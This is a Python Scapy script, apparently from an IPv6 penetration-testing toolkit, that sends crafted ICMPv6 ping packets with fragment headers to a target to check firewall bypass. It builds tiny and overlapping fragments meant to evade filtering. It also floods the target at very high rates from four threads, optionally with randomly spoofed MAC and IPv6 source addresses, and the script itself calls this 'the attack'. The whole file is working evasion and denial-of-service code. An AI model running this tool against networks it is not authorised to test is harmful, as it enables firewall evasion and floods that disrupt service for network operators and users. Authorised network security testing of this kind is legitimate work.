#!/usr/bin/python
import argparse
import logging
import multiprocessing
import random
import sys
import threading
import time

import netifaces
import netifaces as ni
import psutil
from scapy.arch import get_if_hwaddr
from scapy.layers.inet import TCP
from scapy.layers.inet6 import IPv6, IPv6ExtHdrDestOpt, Pad1, PadN, IPv6ExtHdrFragment, ICMPv6EchoRequest, in6_chksum, \
    fragment6, ICMPv6EchoReply, ICMPv6ParamProblem, ICMPv6DestUnreach, ICMPv6TimeExceeded, ICMPv6PacketTooBig
from scapy.layers.l2 import Ether
from scapy.packet import Raw
from scapy.sendrecv import sendp, sniff, sendpfast
from scapy.volatile import RandShort, RandString
from validate_parameters import is_valid_ipv6, is_valid_num, payload, convert_paramProblem, convert_destUnrechable, \
    convert_timeExceeded
from validate_parameters import is_valid_mac
from validate_parameters import is_valid_port

# Increase the recursion limit when calling Python objects (used when lots of Extension headers - > 300 headers)
sys.setrecursionlimit(10 ** 6)


def parameter():
    parser = argparse.ArgumentParser(
        description="Sending ICMPv6 PING message(s) with Fragment Header to a "
                    "target for checking firewall bypass with several related options "
                    "such as atomic fragments with same ID or different ID, 3x Fragment headers, "
                    "and tiny fragments. Option to flood is also included.")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender")
    parser.add_argument("-smac", dest="source_mac", action="store",
                        help="the MAC address of sender (resolved from the interface if skipping)")
    parser.add_argument("-sip", dest="source_ip", action="store", help="the IPv6 address of sender (resolved from the"
                                                                       " interface if skipping)")
    parser.add_argument("-dip", dest="destination_ip", action="store", help="the IPv6 address of destination (ff02::1"
                                                                            " if skipping)")
    parser.add_argument("-frag", dest="frag_hdr", action="store", type=int,
                        help="the number of fragment headers (set to 1 if skipping)")
    parser.add_argument("-id", dest="id", action="store_true", default=False,
                        help="set fragment headers to have the same ID (set to different if skipping)")
    parser.add_argument("-l", dest="data_length", type=int, action="store",
                        help="the size of data in bytes")
    parser.add_argument("-tiny", dest="tiny_frag", action="store_true", default=False, help="allow tiny fragments")
    parser.add_argument("-overlap", dest="overlap_frag", action="store_true", default=False,
                        help="allow overlapping fragments")
    parser.add_argument("-f", dest="flood", action="store", choices=['constant', 'random'],
                        help="flood the targets with option: sending messages using only the defined "
                             "source addresses (constant), or sending messages with many random source "
                             "addresses (random)")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source IPv6 address
    if args.source_ip is None:
        args.source_ip = ni.ifaddresses(args.interface)[ni.AF_INET6][0]['addr']
        args.source_ip = args.source_ip.replace("%", '')
        args.source_ip = args.source_ip.replace(args.interface, '')
    if args.source_ip is not None:
        if not is_valid_ipv6(args.source_ip):
            print("---> The given source IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination IPv6 address
    if args.destination_ip is None:
        print("---> No destination IPv6 address is inserted. Try again!!!")
        sys.exit(1)
    if args.destination_ip is not None:
        if not is_valid_ipv6(args.destination_ip):
            print("---> The given destination IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source MAC address
    if args.source_mac is None:
        args.source_mac = get_if_hwaddr(args.interface)
    if args.source_mac is not None:
        if not is_valid_mac(args.source_mac):
            print("---> The given source MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the number of fragment headers
    if args.frag_hdr is None:
        args.frag_hdr = 1
    if args.frag_hdr is not None:
        if not is_valid_num(args.frag_hdr):
            print("---> The given number of fragment headers is invalid. Try again!!!")
            sys.exit(1)

    # Validate the size of Payload data
    if args.data_length is None:
        args.data_length = 32
    if args.data_length is not None:
        if not is_valid_port(args.data_length):
            print("---> The given size of data is invalid. Try again!!!")
            sys.exit(1)

    # Validate the tiny fragments and overlapping fragments
    if args.tiny_frag and args.overlap_frag:
        print("---> Only one of two options (tiny and overlap) can exist. Try again!!!")
        sys.exit(1)

    # Turning off logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    return args.interface, args.source_mac, args.source_ip, args.destination_ip, args.frag_hdr, args.id, args.data_length, args.tiny_frag, args.overlap_frag, args.flood


def generate(interface, source_mac, source_ip, destination_ip, num_frag_hdr, id, data_length, tiny_frag, overlap_frag, flood):
    # Generate packet
    layer2 = Ether(src=source_mac)
    layer3 = IPv6(src=source_ip, dst=destination_ip, hlim=255)

    frag_hdr = IPv6ExtHdrFragment(id=1, m=0)
    for i in range(num_frag_hdr - 1):
        if id:
            if i == num_frag_hdr - 1:
                frag_hdr /= IPv6ExtHdrFragment(id=1, m=0)
                break
            frag_hdr /= IPv6ExtHdrFragment(id=1, m=0)
        else:
            if i == num_frag_hdr - 1:
                frag_hdr /= IPv6ExtHdrFragment(id=num_frag_hdr+2, m=0)
                break
            frag_hdr /= IPv6ExtHdrFragment(id=i+2, m=0)
    data = payload(data_length)

    packet1 = layer2 / layer3 / frag_hdr / ICMPv6EchoRequest(id=RandShort(), seq=1, data=data)
    stats = psutil.net_if_stats()
    mtu = stats.get(interface).mtu
    if data_length > mtu:
        packet1 = fragment6(packet1, mtu)

    if flood is None:
        if not tiny_frag and not overlap_frag:
            print("Sending packet with Fragment header to destination: " + destination_ip)
            sendp(packet1, verbose=False, iface=interface)
        if tiny_frag:
            print("Sending ICMPv6 Echo Request message with tiny fragments to the destination: ", destination_ip)
            data = "abcdefgh"
            layer3 = IPv6(src=source_ip, dst=destination_ip,
                          plen=16)  # 16 bytes contains 8 bytes of ICMPv6 Header and 8 bytes of Payload
            icmpv6 = ICMPv6EchoRequest()
            csum = in6_chksum(58, layer3 / icmpv6, bytes(icmpv6 / data))
            frag1 = IPv6ExtHdrFragment(offset=0, m=1, id=12345, nh=58)
            frag2 = IPv6ExtHdrFragment(offset=1, m=0, id=12345,
                                       nh=58)  # Avoiding overlapping by setting offset = 1 (8 bytes distance)
            icmpv6 = ICMPv6EchoRequest(cksum=csum)
            packet1 = layer2 / layer3 / frag1 / icmpv6
            packet2 = layer2 / layer3 / frag2 / data

            sendp(packet1, verbose=False, iface=interface)
            sendp(packet2, verbose=False, iface=interface)

        if overlap_frag:
            print("Sending ICMPv6 Echo Request message with overlapping to the destination: ", destination_ip)
            payload1 = 'V' * 1272
            payload2 = 'A' * 1280
            layer3 = IPv6(src=source_ip, dst=destination_ip,
                          plen=1288)  # (1280 bytes Payload 2 + 8 bytes Fragment Header) or (1272 + 8 Frag + 8 ICMPv6)
            icmpv6 = ICMPv6EchoRequest(data=payload1)
            csum = in6_chksum(58, layer3 / icmpv6, bytes(icmpv6 / payload2))
            icmpv6 = ICMPv6EchoRequest(cksum=csum, data=payload1)  # 8 bytes header + 1272 bytes data
            frag1 = IPv6ExtHdrFragment(offset=0, m=1, id=12345, nh=58)
            frag2 = IPv6ExtHdrFragment(offset=2, m=0, id=12345,
                                       nh=58)  # Offset has to be 160 = 1280*8, but 2 offset causes overlapping
            packet1 = layer2 / layer3 / frag1 / icmpv6
            packet2 = layer2 / layer3 / frag2 / payload2

            sendp(packet1, verbose=False, iface=interface)
            sendp(packet2, verbose=False, iface=interface)

    if flood is not None:
        pkt_list = []
        print("Flooding the destination: " + destination_ip + "with PING messages (press Ctrl+C to stop the "
                                                              "attack).....")
        if flood == "constant":
            if not tiny_frag and not overlap_frag:
                for i in range(100):
                    pkt_list.append(packet1)
            if tiny_frag:
                data = "abcdefgh"
                layer3 = IPv6(src=source_ip, dst=destination_ip,
                              plen=16)  # 16 bytes contains 8 bytes of ICMPv6 Header and 8 bytes of Payload
                icmpv6 = ICMPv6EchoRequest()
                csum = in6_chksum(58, layer3 / icmpv6, bytes(icmpv6 / data))
                frag1 = IPv6ExtHdrFragment(offset=0, m=1, id=12345, nh=58)
                frag2 = IPv6ExtHdrFragment(offset=1, m=0, id=12345,
                                           nh=58)  # Avoiding overlapping by setting offset = 1 (8 bytes distance)
                icmpv6 = ICMPv6EchoRequest(cksum=csum)
                packet1 = layer2 / layer3 / frag1 / icmpv6
                packet2 = layer2 / layer3 / frag2 / data

                for i in range(40):
                    pkt_list.append(packet1)
                    pkt_list.append(packet2)
            if overlap_frag:
                payload1 = 'V' * 1272
                payload2 = 'A' * 1280
                layer3 = IPv6(src=source_ip, dst=destination_ip,
                              plen=1288)  # (1280 bytes Payload 2 + 8 bytes Fragment Header) or (1272 + 8 Frag + 8 ICMPv6)
                icmpv6 = ICMPv6EchoRequest(data=payload1)
                csum = in6_chksum(58, layer3 / icmpv6, bytes(icmpv6 / payload2))
                icmpv6 = ICMPv6EchoRequest(cksum=csum, data=payload1)  # 8 bytes header + 1272 bytes data
                frag1 = IPv6ExtHdrFragment(offset=0, m=1, id=12345, nh=58)
                frag2 = IPv6ExtHdrFragment(offset=2, m=0, id=12345,
                                           nh=58)  # Offset has to be 160 = 1280*8, but 2 offset causes overlapping
                packet1 = layer2 / layer3 / frag1 / icmpv6
                packet2 = layer2 / layer3 / frag2 / payload2

                for i in range(40):
                    pkt_list.append(packet1)
                    pkt_list.append(packet2)
        if flood == "random":
            if not tiny_frag and not overlap_frag:
                for i in range(50):
                    random_mac = "02:01:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                              random.randint(0, 255),
                                                              random.randint(0, 255))
                    M = 16 ** 4
                    layer2 = Ether(src=random_mac)
                    source_ip = "2001:dead:" + ":".join(("%x" % random.randint(0, M) for j in range(6)))
                    layer3 = IPv6(src=source_ip, dst=destination_ip, hlim=255)
                    packet1 = layer2 / layer3 / frag_hdr / ICMPv6EchoRequest(id=RandShort(), seq=1, data=data)
                    stats = psutil.net_if_stats()
                    mtu = stats.get(interface).mtu
                    if data_length > mtu:
                        packet1 = fragment6(packet1, mtu)
                    pkt_list.append(packet1)
            if tiny_frag:
                for i in range(40):
                    random_mac = "02:01:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                              random.randint(0, 255),
                                                              random.randint(0, 255))
                    M = 16 ** 4
                    layer2 = Ether(src=random_mac)
                    source_ip = "2001:dead:" + ":".join(("%x" % random.randint(0, M) for j in range(6)))
                    layer3 = IPv6(src=source_ip, dst=destination_ip, plen=16)
                    data = "abcdefgh"
                    icmpv6 = ICMPv6EchoRequest()
                    csum = in6_chksum(58, layer3 / icmpv6, bytes(icmpv6 / data))
                    frag1 = IPv6ExtHdrFragment(offset=0, m=1, id=12345, nh=58)
                    frag2 = IPv6ExtHdrFragment(offset=1, m=0, id=12345,
                                               nh=58)  # Avoiding overlapping by setting offset = 1 (8 bytes distance)
                    icmpv6 = ICMPv6EchoRequest(cksum=csum)
                    packet1 = layer2 / layer3 / frag1 / icmpv6
                    packet2 = layer2 / layer3 / frag2 / data
                    pkt_list.append(packet1)
                    pkt_list.append(packet2)
            if overlap_frag:
                for i in range(40):
                    random_mac = "02:01:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                              random.randint(0, 255),
                                                              random.randint(0, 255))
                    M = 16 ** 4
                    layer2 = Ether(src=random_mac)
                    source_ip = "2001:dead:" + ":".join(("%x" % random.randint(0, M) for j in range(6)))
                    layer3 = IPv6(src=source_ip, dst=destination_ip, plen=1288)
                    payload1 = 'V' * 1272
                    payload2 = 'A' * 1280
                    icmpv6 = ICMPv6EchoRequest(data=payload1)
                    csum = in6_chksum(58, layer3 / icmpv6, bytes(icmpv6 / payload2))
                    icmpv6 = ICMPv6EchoRequest(cksum=csum, data=payload1)  # 8 bytes header + 1272 bytes data
                    frag1 = IPv6ExtHdrFragment(offset=0, m=1, id=12345, nh=58)
                    frag2 = IPv6ExtHdrFragment(offset=2, m=0, id=12345,
                                               nh=58)  # Offset has to be 160 = 1280*8, but 2 offset causes overlapping
                    packet1 = layer2 / layer3 / frag1 / icmpv6
                    packet2 = layer2 / layer3 / frag2 / payload2
                    pkt_list.append(packet1)
                    pkt_list.append(packet2)

        def send_packets(packet, iface):
            try:
                sendpfast(packet, mbps=60000, pps=30000, loop=5000000, iface=iface)
            except KeyboardInterrupt:
                pass

        threads = []
        for i in range(4):
            thread = threading.Thread(target=send_packets, args=(pkt_list, interface))
            threads.append(thread)
            thread.start()

        # wait for all threads to complete
        for thread in threads:
            thread.join()


def sniffing(interface, source_ip, destination_ip):
    # Define our Custom Action function
    ip_list = []

    def custom_action(packet):
        # Create tuple of Src/Dst in sorted order
        if packet[0][1].src not in ip_list:
            if ICMPv6EchoReply in packet:
                print("===> Received Echo Reply from: " + packet[0][1].src + " with MAC: " + packet[0].src)
                ip_list.append(packet[0][1].src)
            if ICMPv6ParamProblem in packet:
                print("===> Received Parameter Problem from: " + packet[0][1].src + " with MAC: " + packet[0].src)
                print("     with error: " + convert_paramProblem(packet[ICMPv6ParamProblem].code))
                ip_list.append(packet[0][1].src)
            if ICMPv6DestUnreach in packet:
                print("===> Received Destination Unreachable from: " + packet[0][1].src + " with MAC: " + packet[0].src)
                print("     with error: " + convert_destUnrechable(packet[ICMPv6DestUnreach].code))
                ip_list.append(packet[0][1].src)
            if ICMPv6TimeExceeded in packet:
                print("===> Received Time Exceeded from: " + packet[0][1].src + " with MAC: " + packet[0].src)
                print("     with error: " + convert_timeExceeded(packet[ICMPv6TimeExceeded].code))
                ip_list.append(packet[0][1].src)
            if ICMPv6PacketTooBig in packet:
                print("===> Received Packet Too Big from: " + packet[0][1].src + " with MAC: " + packet[0].src)
                print("     with informed MTU: " + str(packet[ICMPv6PacketTooBig].mtu))
                ip_list.append(packet[0][1].src)
            else:
                pass

    # Setup sniff, filtering for IP traffic to see the result
    build_filter = "ip6 dst %s" % source_ip

    try:
        sniff(iface=interface, filter=build_filter, prn=custom_action, timeout=2)
        if len(ip_list) < 1:
            print("===> No response found.")
    except KeyboardInterrupt:
        sys.exit(0)


def execute_functions(interface, source_mac, source_ip, destination_ip, num_frag_hdr, id, data_length, tiny_frag, overlap_frag, flood):
    p1 = multiprocessing.Process(target=generate, args=[interface, source_mac, source_ip, destination_ip, num_frag_hdr, id, data_length, tiny_frag, overlap_frag, flood])
    p2 = multiprocessing.Process(target=sniffing, args=[interface, source_ip, destination_ip])
    p2.start()
    p1.start()
    p2.join()
    p1.join()


if __name__ == "__main__":
    interface, source_mac, source_ip, destination_ip, num_frag_hdr, id, data_length, tiny_frag, overlap_frag, flood = parameter()
    if flood is None:
        try:
            execute_functions(interface, source_mac, source_ip, destination_ip, num_frag_hdr, id, data_length, tiny_frag, overlap_frag, flood)
        except KeyboardInterrupt:
            sys.exit(0)
    else:
        try:
            generate(interface, source_mac, source_ip, destination_ip, num_frag_hdr, id, data_length, tiny_frag, overlap_frag, flood)
        except KeyboardInterrupt:
            # If KeyboardInterrupt is raised in the main thread, stop all child threads
            threading.Event().set()
            sys.exit(0)






